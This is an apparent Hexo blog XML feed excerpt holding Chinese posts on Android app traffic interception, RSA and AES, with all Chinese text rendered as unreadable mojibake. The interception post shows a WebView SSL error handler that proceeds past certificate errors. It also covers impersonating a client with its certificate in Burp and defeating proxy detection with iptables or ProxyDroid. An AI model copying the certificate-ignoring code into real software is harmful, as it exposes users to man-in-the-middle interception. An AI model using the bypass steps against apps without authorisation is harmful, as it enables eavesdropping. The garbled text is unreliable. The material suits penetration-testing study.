·burpåˆå¯ä»¥æ­£å¸¸å†’å……å®¢æˆ·ç«¯èº«ä»½è¯äº†ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼ŒæŠŠå®¢æˆ·ç«¯è¯ä¹¦å¯¼å…¥åˆ°burpä¸­:</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406232211006.png" alt="image.png"> </p><p>æŠ“åŒ…æ•ˆæœå¦‚ä¸‹:</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406232212855.png" alt="image.png"> </p><h2 id="5-webviewè¯ä¹¦æ ¡éªŒ"><a href="#5-webviewè¯ä¹¦æ ¡éªŒ" class="headerlink" title="5. webviewè¯ä¹¦æ ¡éªŒ"></a>5. webviewè¯ä¹¦æ ¡éªŒ</h2><p>åœ¨ä½¿ç”¨WebViewè¿›è¡ŒHTTPSè¯·æ±‚æ—¶ï¼ŒåŒæ ·å¯ä»¥å¯¹HTTPSè¯ä¹¦è¿›è¡Œæ ¡éªŒï¼ŒWebViewæ§ä»¶å¯¹è¯·æ±‚é€»è¾‘è¿›è¡Œäº†å°è£…ï¼Œæ‰€ä»¥è¿›è¡Œè¯ä¹¦æ ¡éªŒæ›´åŠ æ–¹ä¾¿ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼Œhandler.cancel()ç›¸å½“äºä½¿ç”¨ç³»ç»Ÿè¯ä¹¦æ ¡éªŒ:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mWebview.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceivedSslError</span><span class="params">(WebView view, SslErrorHandler handler, SslError error)</span> &#123;</span><br><span class="line">        <span class="comment">//å¿½ç•¥è¯ä¹¦æ ¡éªŒ</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;trustAllCerts&quot;</span>.equals(tag))&#123;</span><br><span class="line">            handler.proceed();</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            handler.cancel();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å¦‚æœæƒ³SSL PININGï¼ŒåŒæ ·å¯ä»¥é€šè¿‡res&#x2F;xml&#x2F;network_security_config.xmlé…ç½®æ–‡ä»¶å¯¹æœåŠ¡ç«¯è¯ä¹¦è¿›è¡Œæ ¡éªŒã€‚å¯¹æŠ—è¯ä¹¦æ ¡éªŒçš„æ–¹æ³•å’ŒOkHttpç½‘ç»œæ¡†æ¶ä¸€æ ·ï¼Œå…·ä½“å‚è€ƒä¸Šæ–‡ï¼Œé™¤äº†åŒå‘æ ¡éªŒä»¥å¤–ï¼ŒæŠ“åŒ…æˆªå›¾ä¸­éƒ½æœ‰WebViewçš„è¯·æ±‚æŠ¥æ–‡ã€‚</p><h2 id="6-ä»£ç†æ£€æµ‹"><a href="#6-ä»£ç†æ£€æµ‹" class="headerlink" title="6. ä»£ç†æ£€æµ‹"></a>6. ä»£ç†æ£€æµ‹</h2><p>é™¤äº†æ ¡éªŒHTTPSè¯ä¹¦é˜²æ­¢ä¸­é—´äººæŠ“åŒ…ä»¥å¤–ï¼Œå¸¸è§çš„æ–¹æ³•è¿˜æœ‰é€šè¿‡æ£€æµ‹ä»£ç†é˜²æ­¢æŠ“åŒ…ï¼Œå…¶åŸç†æ˜¯æ£€æµ‹åˆ°è®¾å¤‡å¼€å¯ç³»ç»Ÿä»£ç†åï¼ŒAPPä¸­é€šè¿‡ä»£ç å®ç°ç¦ç”¨ä»£ç†ï¼Œä»¥OkHttpæ¡†æ¶ä¸ºä¾‹ï¼Œç¤ºåˆ—ä»£ç å¦‚ä¸‹:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* æ£€æµ‹ä»£ç†</span></span><br><span class="line"><span class="comment">* ç›´æ¥ç»•è¿‡ä»£ç†ï¼Œç½‘ç»œæ­£å¸¸ä½†æŠ“åŒ…å·¥å…·æ— æ³•æŠ“åŒ…</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mCheckProxy = findViewById(R.id.checkProxy);</span><br><span class="line">mCheckProxy.setOnCheckedChangeListener(<span class="keyword">new</span> <span class="title class_">CompoundButton</span>.OnCheckedChangeListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCheckedChanged</span><span class="params">(CompoundButton buttonView, <span class="type">boolean</span> isChecked)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (isChecked)&#123;</span><br><span class="line">            client = <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>().newBuilder().proxy(Proxy.NO_PROXY).build();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            client = <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å¯¹æŠ—æ–¹æ³•ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œå¯ä»¥ä½¿ç”¨iptableså¯¹è¯·æ±‚è¿›è¡Œå¼ºåˆ¶è½¬å‘ï¼ŒProxyDroidå…¨å±€ä»£ç†å·¥å…·å°±æ˜¯é€šè¿‡iptableså®ç°çš„ï¼Œæ‰€ä»¥ä½¿ç”¨ProxyDroidå¼€å¯ä»£ç†ï¼Œå¯ä»¥æ¯”è¾ƒæœ‰æ•ˆçš„ç»•è¿‡ä»£ç†æ£€æµ‹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APP </tag>
            
            <tag> æŠ“åŒ… </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç®—æ³•è¿˜åŸä¹‹RSA</title>
      <link href="/2024/06/19/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BRSA/"/>
      <url>/2024/06/19/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BRSA/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€-ç®€ä»‹"><a href="#ä¸€-ç®€ä»‹" class="headerlink" title="ä¸€ ç®€ä»‹"></a>ä¸€ ç®€ä»‹</h1><p>RSAåŠ å¯†ç®—æ³•æ˜¯ä¸€ç§éå¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œæ‰€è°“éå¯¹ç§°ï¼Œå°±æ˜¯æŒ‡è¯¥ç®—æ³•åŠ å¯†å’Œè§£å¯†ä½¿ç”¨ä¸åŒçš„å¯†é’¥ï¼Œå³ä½¿ç”¨åŠ å¯†å¯†é’¥è¿›è¡ŒåŠ å¯†ã€è§£å¯†å¯†é’¥è¿›è¡Œè§£å¯†ã€‚åœ¨RASç®—æ³•ä¸­ï¼ŒåŠ å¯†å¯†é’¥ï¼ˆå³å…¬å¼€å¯†é’¥ï¼‰PKæ˜¯å…¬å¼€ä¿¡æ¯ï¼Œè€Œè§£å¯†å¯†é’¥ï¼ˆå³ç§˜å¯†å¯†é’¥ï¼‰SKæ˜¯éœ€è¦ä¿å¯†çš„ã€‚åŠ å¯†ç®—æ³•Eå’Œè§£å¯†ç®—æ³•Dä¹Ÿéƒ½æ˜¯å…¬å¼€çš„ã€‚è™½ç„¶è§£å¯†å¯†é’¥SKæ˜¯ç”±å…¬å¼€å¯†é’¥PKå†³å®šçš„ï¼Œç”±äºæ— æ³•è®¡ç®—å‡ºå¤§æ•°nçš„æ¬§æ‹‰å‡½æ•°phi(N)ï¼Œæ‰€ä»¥ä¸èƒ½æ ¹æ®PKè®¡ç®—å‡ºSKã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹æå¤§æ•´æ•°åšå› æ•°åˆ†è§£çš„éš¾åº¦å†³å®šäº†RSAç®—æ³•çš„å¯é æ€§ã€‚ç†è®ºä¸Šï¼Œåªè¦å…¶é’¥åŒ™çš„é•¿åº¦nè¶³å¤Ÿé•¿ï¼Œç”¨RSAåŠ å¯†çš„ä¿¡æ¯å®é™…ä¸Šæ˜¯ä¸èƒ½è¢«è§£ç ´çš„ã€‚</p><p>RSAç®—æ³•é€šå¸¸æ˜¯å…ˆç”Ÿæˆä¸€å¯¹RSAå¯†é’¥ï¼Œå…¶ä¸­ä¹‹ä¸€æ˜¯ä¿å¯†å¯†é’¥ï¼Œç”±ç”¨æˆ·ä¿å­˜ï¼›å¦ä¸€ä¸ªä¸ºå…¬å¼€å¯†é’¥ï¼Œå¯å¯¹å¤–å…¬å¼€ã€‚ä¸ºæé«˜ä¿å¯†å¼ºåº¦ï¼ŒRSAå¯†é’¥è‡³å°‘ä¸º500ä½é•¿ï¼Œä¸€èˆ¬æ¨èä½¿ç”¨1024ä½ã€‚è¿™å°±ä½¿åŠ å¯†çš„è®¡ç®—é‡å¾ˆå¤§ã€‚ä¸ºå‡å°‘è®¡ç®—é‡ï¼Œåœ¨ä¼ é€ä¿¡æ¯æ—¶ï¼Œå¸¸é‡‡ç”¨ä¼ ç»ŸåŠ å¯†æ–¹æ³•ä¸å…¬å¼€å¯†é’¥åŠ å¯†æ–¹æ³•ç›¸ç»“åˆçš„æ–¹å¼ï¼Œå³ä¿¡æ¯é‡‡ç”¨æ”¹è¿›çš„DESæˆ–IDEAå¯†é’¥åŠ å¯†ï¼Œç„¶åä½¿ç”¨RSAå¯†é’¥åŠ å¯†å¯¹è¯å¯†é’¥å’Œä¿¡æ¯æ‘˜è¦ã€‚å¯¹æ–¹æ”¶åˆ°ä¿¡æ¯åï¼Œç”¨ä¸åŒçš„å¯†é’¥è§£å¯†å¹¶å¯æ ¸å¯¹ä¿¡æ¯æ‘˜è¦ã€‚</p><p><strong>RSAå¯†é’¥é•¿åº¦éšç€ä¿å¯†çº§åˆ«æé«˜ï¼Œå¢åŠ å¾ˆå¿«ã€‚</strong>ä¸‹è¡¨åˆ—å‡ºäº†å¯¹åŒä¸€å®‰å…¨çº§åˆ«æ‰€å¯¹åº”çš„å¯†é’¥é•¿åº¦ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406200939635.png" alt="img"> </p><h1 id="äºŒ-RSAåŠ å¯†è¿‡ç¨‹"><a href="#äºŒ-RSAåŠ å¯†è¿‡ç¨‹" class="headerlink" title="äºŒ RSAåŠ å¯†è¿‡ç¨‹"></a>äºŒ RSAåŠ å¯†è¿‡ç¨‹</h1><p>RSAçš„åŠ å¯†è¿‡ç¨‹å¯ä»¥ä½¿ç”¨ä¸€ä¸ªé€šå¼æ¥è¡¨è¾¾ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406200939049.png" alt="img"> </p><p>ä¹Ÿå°±æ˜¯è¯´RSAåŠ å¯†æ˜¯å¯¹æ˜æ–‡çš„Eæ¬¡æ–¹åé™¤ä»¥Nåæ±‚ä½™æ•°çš„è¿‡ç¨‹ã€‚ä»é€šå¼å¯çŸ¥ï¼Œåªè¦çŸ¥é“Eå’ŒNä»»ä½•äººéƒ½å¯ä»¥è¿›è¡ŒRSAåŠ å¯†äº†ï¼Œæ‰€ä»¥è¯´Eã€Næ˜¯RSAåŠ å¯†çš„å¯†é’¥ï¼Œä¹Ÿå°±æ˜¯è¯´<strong>Eå’ŒNçš„ç»„åˆå°±æ˜¯å…¬é’¥</strong>ï¼Œæˆ‘ä»¬ç”¨(E,N)æ¥è¡¨ç¤ºå…¬é’¥ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406200939028.png" alt="img"> </p><p>ä¸è¿‡Eå’ŒNä¸å¹¶ä¸æ˜¯éšä¾¿ä»€ä¹ˆæ•°éƒ½å¯ä»¥çš„ï¼Œå®ƒä»¬éƒ½æ˜¯ç»è¿‡ä¸¥æ ¼çš„æ•°å­¦è®¡ç®—å¾—å‡ºçš„ï¼Œå…³äºEå’ŒNæ‹¥æœ‰ä»€ä¹ˆæ ·çš„è¦æ±‚åŠå…¶ç‰¹æ€§åé¢ä¼šè®²åˆ°ã€‚Eæ˜¯åŠ å¯†ï¼ˆEncryptionï¼‰çš„é¦–å­—æ¯ï¼ŒNæ˜¯æ•°å­—ï¼ˆNumberï¼‰çš„é¦–å­—æ¯ã€‚</p><h1 id="ä¸‰-RSAè§£å¯†è¿‡ç¨‹"><a href="#ä¸‰-RSAè§£å¯†è¿‡ç¨‹" class="headerlink" title="ä¸‰ RSAè§£å¯†è¿‡ç¨‹"></a>ä¸‰ RSAè§£å¯†è¿‡ç¨‹</h1><p>RSAçš„è§£å¯†åŒæ ·å¯ä»¥ä½¿ç”¨ä¸€ä¸ªé€šå¼æ¥è¡¨è¾¾ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406200944123.png" alt="img"> </p><p>ä¹Ÿå°±æ˜¯è¯´å¯¹å¯†æ–‡è¿›è¡ŒDæ¬¡æ–¹åé™¤ä»¥Nçš„ä½™æ•°å°±æ˜¯æ˜æ–‡ï¼Œè¿™å°±æ˜¯RSAè§£å¯†è¿‡ç¨‹ã€‚çŸ¥é“Då’ŒNå°±èƒ½è¿›è¡Œè§£å¯†å¯†æ–‡äº†ï¼Œæ‰€ä»¥Då’ŒNçš„ç»„åˆå°±æ˜¯ç§é’¥ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406200944134.png" alt="img"> </p><p>ä»ä¸Šè¿°å¯ä»¥çœ‹å‡ºRSAçš„åŠ å¯†æ–¹å¼å’Œè§£å¯†æ–¹å¼æ˜¯ç›¸åŒçš„ï¼ŒåŠ å¯†æ˜¯æ±‚â€œEæ¬¡æ–¹çš„mod Nâ€;è§£å¯†æ˜¯æ±‚â€œDæ¬¡æ–¹çš„mod Nâ€ã€‚æ­¤å¤„Dæ˜¯è§£å¯†ï¼ˆDecryptionï¼‰çš„é¦–å­—æ¯ï¼›Næ˜¯æ•°å­—ï¼ˆNumberï¼‰çš„é¦–å­—æ¯ã€‚</p><p>å°ç»“ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406200944454.png" alt="image.png"> </p><h1 id="å››-ç”Ÿæˆå¯†é’¥å¯¹"><a href="#å››-ç”Ÿæˆå¯†é’¥å¯¹" class="headerlink" title="å›› ç”Ÿæˆå¯†é’¥å¯¹"></a>å›› ç”Ÿæˆå¯†é’¥å¯¹</h1><p>æ—¢ç„¶å…¬é’¥æ˜¯ï¼ˆEï¼ŒNï¼‰ï¼Œç§é’¥æ˜¯ï¼ˆDï¼ŒNï¼‰ï¼Œæ‰€ä»¥å¯†é’¥å¯¹å³ä¸ºï¼ˆEï¼ŒDï¼ŒNï¼‰ï¼Œä½†å¯†é’¥å¯¹æ˜¯æ€æ ·ç”Ÿæˆçš„ï¼Ÿæ­¥éª¤å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ±‚N</span><br><span class="line">æ±‚Lï¼ˆLä¸ºä¸­é—´è¿‡ç¨‹çš„ä¸­é—´æ•°ï¼‰</span><br><span class="line">æ±‚E</span><br><span class="line">æ±‚D</span><br></pre></td></tr></table></figure><h2 id="æ±‚Nï¼š"><a href="#æ±‚Nï¼š" class="headerlink" title="æ±‚Nï¼š"></a>æ±‚Nï¼š</h2><p>å‡†å¤‡ä¸¤ä¸ªäº’è´¨æ•°pï¼Œqã€‚è¿™ä¸¤ä¸ªæ•°ä¸èƒ½å¤ªå°ï¼Œå¤ªå°åˆ™ä¼šå®¹æ˜“ç ´è§£ï¼Œå°†pä¹˜ä»¥qå°±æ˜¯Nã€‚å¦‚æœäº’è´¨æ•°på’Œqè¶³å¤Ÿå¤§ï¼Œé‚£ä¹ˆæ ¹æ®ç›®å‰çš„è®¡ç®—æœºæŠ€æœ¯å’Œå…¶ä»–å·¥å…·ï¼Œè‡³ä»Šä¹Ÿæ²¡èƒ½ä»Nåˆ†è§£å‡ºpå’Œqã€‚æ¢å¥è¯è¯´ï¼Œåªè¦å¯†é’¥é•¿åº¦Nè¶³å¤Ÿå¤§ï¼ˆä¸€èˆ¬1024è¶³çŸ£ï¼‰ï¼ŒåŸºæœ¬ä¸Šä¸å¯èƒ½ä»å…¬é’¥ä¿¡æ¯æ¨å‡ºç§é’¥ä¿¡æ¯ã€‚</p><p>N &#x3D; p * q</p><h2 id="æ±‚Lï¼š"><a href="#æ±‚Lï¼š" class="headerlink" title="æ±‚Lï¼š"></a>æ±‚Lï¼š</h2><p>L æ˜¯ pï¼1 å’Œ qï¼1çš„æœ€å°å…¬å€æ•°ï¼Œå¯ç”¨å¦‚ä¸‹è¡¨è¾¾å¼è¡¨ç¤º</p><p>L &#x3D; lcmï¼ˆpï¼1ï¼Œqï¼1ï¼‰</p><h2 id="æ±‚Eï¼š"><a href="#æ±‚Eï¼š" class="headerlink" title="æ±‚Eï¼š"></a>æ±‚Eï¼š</h2><p>Eå¿…é¡»æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼šEæ˜¯ä¸€ä¸ªæ¯”1å¤§æ¯”Lå°çš„æ•°ï¼ŒEå’ŒLçš„æœ€å¤§å…¬çº¦æ•°ä¸º1ï¼›</p><p>ç”¨gcd(X,Y)æ¥è¡¨ç¤ºXï¼ŒYçš„æœ€å¤§å…¬çº¦æ•°åˆ™Eæ¡ä»¶å¦‚ä¸‹ï¼š</p><p>1 &lt; E &lt; L</p><p>gcdï¼ˆEï¼ŒLï¼‰&#x3D;1</p><h2 id="æ±‚Dï¼š"><a href="#æ±‚Dï¼š" class="headerlink" title="æ±‚Dï¼š"></a>æ±‚Dï¼š</h2><p>æ•°Dæ˜¯ç”±æ•°Eè®¡ç®—å‡ºæ¥çš„ï¼Œæ•°Då¿…é¡»ä¿è¯è¶³å¤Ÿå¤§ã€‚Dã€Eå’ŒLä¹‹é—´å¿…é¡»æ»¡è¶³ä»¥ä¸‹å…³ç³»ï¼š</p><p>1 &lt; D &lt; L</p><p>Eï¼ŠD mod L ï¼ 1</p><p>åªè¦Dæ»¡è¶³ä¸Šè¿°2ä¸ªæ¡ä»¶ï¼Œåˆ™é€šè¿‡Eå’ŒNè¿›è¡ŒåŠ å¯†çš„å¯†æ–‡å°±å¯ä»¥ç”¨Då’ŒNè¿›è¡Œè§£å¯†ã€‚ç®€å•åœ°è¯´æ¡ä»¶2æ˜¯ä¸ºäº†ä¿è¯å¯†æ–‡è§£å¯†åçš„æ•°æ®å°±æ˜¯æ˜æ–‡ã€‚</p><p>ç°åœ¨ç§é’¥è‡ªç„¶ä¹Ÿå·²ç»ç”Ÿæˆäº†ï¼Œå¯†é’¥å¯¹ä¹Ÿå°±è‡ªç„¶ç”Ÿæˆäº†ã€‚</p><p>å°ç»“ï¼š</p><table><thead><tr><th>æ±‚N</th><th>Nï¼ p ï¼Š q ï¼›pï¼Œqä¸ºè´¨æ•°</th></tr></thead><tbody><tr><td>æ±‚L</td><td>Lï¼lcmï¼ˆpï¼1ï¼Œqï¼1ï¼‰ ï¼›Lä¸ºpï¼1ã€qï¼1çš„æœ€å°å…¬å€æ•°</td></tr><tr><td>æ±‚E</td><td>1 &lt; E &lt; Lï¼Œgcdï¼ˆEï¼ŒLï¼‰&#x3D;1ï¼›Eï¼ŒLæœ€å¤§å…¬çº¦æ•°ä¸º1ï¼ˆEå’ŒLäº’è´¨ï¼‰</td></tr><tr><td>æ±‚D</td><td>1 &lt; D &lt; Lï¼ŒEï¼ŠD mod L ï¼ 1</td></tr></tbody></table><h1 id="äº”-å®è·µ"><a href="#äº”-å®è·µ" class="headerlink" title="äº” å®è·µ"></a>äº” å®è·µ</h1><p>ä¸ºäº†è®¡ç®—æ–¹ä¾¿ï¼Œp q çš„å€¼å–å°ä¸€æ—¦ï¼Œå‡è®¾ï¼šp ï¼ 17ï¼Œq ï¼ 19ï¼Œåˆ™ï¼š</p><p>ï¼ˆ1ï¼‰æ±‚Nï¼šN ï¼ p ï¼Š q ï¼ 323ï¼›</p><p>ï¼ˆ2ï¼‰æ±‚Lï¼šL ï¼ lcmï¼ˆpï¼1ï¼Œ qï¼1ï¼‰ï¼ lcm(16ï¼Œ18ï¼‰ ï¼ 144ï¼Œ144ä¸º16å’Œ18å¯¹æœ€å°å…¬å€æ•°ï¼›</p><p>ï¼ˆ3ï¼‰æ±‚Eï¼š1 &lt; E &lt; L ï¼Œgcdï¼ˆEï¼ŒLï¼‰&#x3D;1ï¼Œå³1 &lt; E &lt; 144ï¼Œgcdï¼ˆEï¼Œ144ï¼‰ ï¼ 1ï¼ŒEå’Œ144äº’ä¸ºè´¨æ•°ï¼ŒE &#x3D; 5æ˜¾ç„¶æ»¡è¶³ä¸Šè¿°2ä¸ªæ¡ä»¶ï¼Œæ•…E ï¼ 5ï¼Œæ­¤æ—¶<strong>å…¬é’¥&#x3D; (Eï¼ŒNï¼‰ï¼ï¼ˆ5ï¼Œ323ï¼‰</strong>ï¼›</p><p>ï¼ˆ4ï¼‰æ±‚Dï¼šæ±‚Dä¹Ÿå¿…é¡»æ»¡è¶³2ä¸ªæ¡ä»¶ï¼š1 &lt; D &lt; Lï¼ŒEï¼ŠD mod L ï¼ 1ï¼Œå³1 &lt; D &lt; 144ï¼Œ5 ï¼Š D mod 144 ï¼ 1ï¼Œæ˜¾ç„¶å½“Dï¼ 29 æ—¶æ»¡è¶³ä¸Šè¿°ä¸¤ä¸ªæ¡ä»¶ã€‚1 &lt; 29 &lt; 144ï¼Œ5ï¼Š29 mod 144 ï¼ 145 mod 144 ï¼ 1ï¼Œæ­¤æ—¶ç§é’¥ï¼ï¼ˆDï¼ŒNï¼‰ï¼ï¼ˆ29ï¼Œ323ï¼‰ï¼›</p><p>ï¼ˆ5ï¼‰åŠ å¯†ï¼šå‡†å¤‡çš„æ˜æ–‡å¿…é¡»æ˜¯å°äºNçš„æ•°ï¼Œå› ä¸ºåŠ å¯†æˆ–è€…è§£å¯†éƒ½è¦ mod Nï¼Œå…¶ç»“æœå¿…é¡»å°äºNã€‚</p><p>å‡è®¾æ˜æ–‡ ï¼ 123ï¼Œåˆ™ å¯†æ–‡ï¼ï¼ˆ123çš„5æ¬¡æ–¹ï¼‰mod 323&#x3D;225</p><p>ï¼ˆ6ï¼‰è§£å¯†ï¼šæ˜æ–‡ï¼ï¼ˆ225çš„29æ¬¡æ–¹ï¼‰mod 323 &#x3D;123ï¼Œæ‰€ä»¥è§£å¯†åçš„æ˜æ–‡ä¸º123ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³•è¿˜åŸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³•è¿˜åŸ </tag>
            
            <tag> RSA </tag>
            
            <tag> éå¯¹ç§°åŠ å¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç®—æ³•è¿˜åŸä¹‹AES</title>
      <link href="/2024/06/17/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BAES/"/>
      <url>/2024/06/17/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BAES/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><hr><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://blog.csdn.net/xnxqwzy/article/details/136698541">https://blog.csdn.net/xnxqwzy/article/details/136698541</a></p><p><a href="https://www.cnblogs.com/yunshangkanjing/p/12765147.html">https://www.cnblogs.com/yunshangkanjing/p/12765147.html</a></p><p><a href="https://blog.csdn.net/qq_43529443/article/details/117386078">https://blog.csdn.net/qq_43529443/article/details/117386078</a></p><p><a href="https://blog.csdn.net/weixin_44767965/article/details/122520302">https://blog.csdn.net/weixin_44767965/article/details/122520302</a></p><hr><h1 id="ä¸€-AESç®€ä»‹"><a href="#ä¸€-AESç®€ä»‹" class="headerlink" title="ä¸€ AESç®€ä»‹"></a>ä¸€ AESç®€ä»‹</h1><p>é«˜çº§åŠ å¯†æ ‡å‡†(AES,Advanced Encryption Standard)ä¸ºæœ€å¸¸è§çš„å¯¹ç§°åŠ å¯†ç®—æ³•(å¾®ä¿¡å°ç¨‹åºåŠ å¯†ä¼ è¾“å°±æ˜¯ç”¨è¿™ä¸ªåŠ å¯†ç®—æ³•çš„)ã€‚å¯¹ç§°åŠ å¯†ç®—æ³•ä¹Ÿå°±æ˜¯åŠ å¯†å’Œè§£å¯†ç”¨ç›¸åŒçš„å¯†é’¥ï¼Œå…·ä½“çš„åŠ å¯†æµç¨‹å¦‚ä¸‹å›¾ï¼š </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406180942347.png" alt="image-20240618094250255"> </p><p>ä¸‹é¢è¯´æ˜ä¸€ä¸‹å„ä¸ªå­—æ®µçš„ä½œç”¨ä¸æ„ä¹‰ï¼š</p><p><strong>æ˜æ–‡pï¼š</strong></p><p>æ²¡æœ‰ç»è¿‡åŠ å¯†çš„æ•°æ®ã€‚</p><p><strong>å¯†é’¥K</strong>ï¼š</p><p>ç”¨æ¥åŠ å¯†æ˜æ–‡çš„å¯†ç ï¼Œåœ¨å¯¹ç§°åŠ å¯†ç®—æ³•ä¸­ï¼ŒåŠ å¯†ä¸è§£å¯†çš„å¯†é’¥æ˜¯ç›¸åŒçš„ã€‚</p><p>å¯†é’¥ä¸ºæ¥æ”¶æ–¹ä¸å‘é€æ–¹åå•†äº§ç”Ÿï¼Œä½†ä¸å¯ä»¥ç›´æ¥åœ¨ç½‘ç»œä¸Šä¼ è¾“ï¼Œå¦åˆ™å¯èƒ½ä¼šå¯¼è‡´å¯†é’¥æ³„éœ²ï¼Œé€šå¸¸æ˜¯é€šè¿‡éå¯¹ç§°åŠ å¯†ç®—æ³•åŠ å¯†å¯†é’¥ï¼Œç„¶åå†é€šè¿‡ç½‘ç»œä¼ è¾“ç»™å¯¹æ–¹ï¼Œæˆ–è€…ç›´æ¥é¢å¯¹é¢åå•†å¯†é’¥ã€‚å¯†é’¥æ˜¯ç»å¯¹ä¸èƒ½æ³„éœ²çš„ï¼Œå¦åˆ™ä¼šè¢«æ”»å‡»è€…è¿˜åŸå¯†æ–‡ï¼Œçªƒå–æœºå¯†æ•°æ®ã€‚</p><p><strong>AESåŠ å¯†å‡½æ•°</strong>ï¼š</p><p>è®¾AESåŠ å¯†å‡½æ•°ä¸ºEï¼Œåˆ™ C &#x3D; E(K, P),å…¶ä¸­Pä¸ºæ˜æ–‡ï¼ŒKä¸ºå¯†é’¥ï¼ŒCä¸ºå¯†æ–‡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒæŠŠæ˜æ–‡På’Œå¯†é’¥Kä½œä¸ºåŠ å¯†å‡½æ•°çš„å‚æ•°è¾“å…¥ï¼Œåˆ™åŠ å¯†å‡½æ•°Eä¼šè¾“å‡ºå¯†æ–‡Cã€‚</p><p><strong>å¯†æ–‡C</strong>ï¼š</p><p>ç»è¿‡åŠ å¯†å‡½æ•°å¤„ç†åçš„æ•°æ®</p><p><strong>AESè§£å¯†å‡½æ•°</strong>ï¼š</p><p>è®¾AESè§£å¯†å‡½æ•°ä¸ºDï¼Œåˆ™ P &#x3D; D(K, C),å…¶ä¸­Cä¸ºå¯†æ–‡ï¼ŒKä¸ºå¯†é’¥ï¼ŒPä¸ºæ˜æ–‡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒæŠŠå¯†æ–‡Cå’Œå¯†é’¥Kä½œä¸ºè§£å¯†å‡½æ•°çš„å‚æ•°è¾“å…¥ï¼Œåˆ™è§£å¯†å‡½æ•°ä¼šè¾“å‡ºæ˜æ–‡Pã€‚</p><h1 id="äºŒ-AESç®—æ³•åŸç†"><a href="#äºŒ-AESç®—æ³•åŸç†" class="headerlink" title="äºŒ AESç®—æ³•åŸç†"></a>äºŒ AESç®—æ³•åŸç†</h1><p>AESä¸ºåˆ†ç»„å¯†ç ï¼Œåˆ†ç»„å¯†ç ä¹Ÿå°±æ˜¯æŠŠæ˜æ–‡åˆ†æˆä¸€ç»„ä¸€ç»„çš„ï¼Œæ¯ç»„é•¿åº¦ç›¸ç­‰ï¼Œæ¯æ¬¡åŠ å¯†ä¸€ç»„æ•°æ®ï¼Œç›´åˆ°åŠ å¯†å®Œæ•´ä¸ªæ˜æ–‡ã€‚åœ¨AESæ ‡å‡†è§„èŒƒä¸­ï¼Œåˆ†ç»„é•¿åº¦åªèƒ½æ˜¯128ä½ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯ä¸ªåˆ†ç»„ä¸º16ä¸ªå­—èŠ‚ï¼ˆæ¯ä¸ªå­—èŠ‚8ä½ï¼‰ã€‚å¯†é’¥çš„é•¿åº¦å¯ä»¥ä½¿ç”¨128ä½ã€192ä½æˆ–256ä½ã€‚å¯†é’¥çš„é•¿åº¦ä¸åŒï¼Œæ¨èåŠ å¯†è½®æ•°ä¹Ÿä¸åŒï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š</p><table><thead><tr><th>AES</th><th>å¯†é’¥é•¿åº¦ï¼ˆ32ä½æ¯”ç‰¹å­—)</th><th>åˆ†ç»„é•¿åº¦(32ä½æ¯”ç‰¹å­—)</th><th>åŠ 